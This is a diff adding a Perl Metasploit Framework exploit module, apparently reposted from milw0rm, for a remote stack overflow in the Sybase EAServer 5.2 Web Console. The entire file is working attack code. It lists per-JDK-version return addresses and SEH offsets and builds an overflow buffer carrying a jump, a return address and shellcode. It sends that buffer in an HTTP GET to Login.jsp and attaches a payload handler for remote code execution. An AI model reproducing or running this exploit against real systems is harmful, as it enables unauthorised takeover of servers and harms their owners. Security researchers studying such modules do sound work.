@@ -1,0 +1,127 @@
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::sybase_easerver;
+use strict;
+use base "Msf::Exploit";
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'  => 'Sybase EAServer 5.2 Remote Stack Overflow',
+	'Version'  => '$Revision: 1.4 $',
+	'Authors' => [ 'anonymous' ],
+	'Arch'  => [ 'x86' ],
+	'OS'    => [ 'win32', 'winxp', 'win2k', 'win2003' ],
+	'Priv'  => 1,
+
+	'AutoOpts'  =>
+	  {
+		'EXITFUNC' => 'thread'
+	  },
+
+	'UserOpts'  =>
+	  {
+		'RHOST' => [1, 'ADDR', 'The target address'],
+		'RPORT' => [1, 'PORT', 'The target port', 8080 ],
+		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
+		'DIR'   => [1, 'DATA', 'Directory of Login.jsp script', '/WebConsole/'],
+		'SSL'   => [0, 'BOOL', 'Use SSL'],
+	  },
+
+	'Payload' =>
+	  {
+		'Space'     => 1000,
+		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\\$\%",
+		'Prepend'	=> "\x81\xc4\x1f\xff\xff\xff\x44", # make stack happy
+		'Keys' 	    => ['+ws2ord'],
+	  },
+
+	'Description'  => Pex::Text::Freeform(qq{
+		This module exploits a stack overflow in the Sybase EAServer Web
+        Console. The offset to the SEH frame appears to change depending
+		on what version of Java is in use by the remote server, making this
+		exploit somewhat unreliable.
+}),
+
+	'Refs'  =>
+	  [
+		['BID', 14287],
+	  ],
+
+	'Targets' =>
+	  [
+	  	# Technically we could combine these into a single multi-return string...
+		[ 'Windows All - Sybase EAServer 5.2 - jdk 1.3.1_11', 0x6d4548ff, 3820],
+		[ 'Windows All - Sybase EAServer 5.2 - jdk 1.3.?.?',  0x6d4548ff, 3841],
+		[ 'Windows All - Sybase EAServer 5.2 - jdk 1.4.2_06', 0x08041b25, 3912],
+		[ 'Windows All - Sybase EAServer 5.2 - jdk 1.4.1_02', 0x08041b25, 3925],
+	  ],
+
+	'Keys'  => ['easerver'],
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self        = shift;
+	my $target_host = $self->GetVar('RHOST');
+	my $target_port = $self->GetVar('RPORT');
+	my $target_idx  = $self->GetVar('TARGET');
+	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
+	my $dir         = $self->GetVar('DIR');
+	my $target      = $self->Targets->[$target_idx];
+
+	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );
+
+	my $s = Msf::Socket::Tcp->new(
+		'PeerAddr'  => $target_host,
+		'PeerPort'  => $target_port,
+		'SSL'      => $self->GetVar('SSL'),
+	  );
+
+	if ( $s->IsError ) {
+		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
+		return;
+	}
+
+
+	my $crash = Pex::Text::AlphaNumText(5000);
+	
+	substr($crash, $target->[2] - 4, 2, "\xeb\x06");	
+	substr($crash, $target->[2]    , 4, pack("V", $target->[1]));
+	substr($crash, $target->[2] + 4, length($shellcode), $shellcode);
+	
+	$dir = $dir . "Login.jsp?" . $crash;
+
+	my $request =
+	  "GET $dir HTTP/1.1\r\n".
+	  "Accept: */*\r\n".
+	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
+	  "Host: $target_host:$target_port\r\n".
+	  "Connection: Close\r\n".
+	  "\r\n";
+
+	$s->Send($request);
+
+	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds");
+	select(undef, undef, undef, 4);
+
+	$self->Handler($s);
+	return;
+}
+
+1;
+
+# milw0rm.com [2006-04-15]
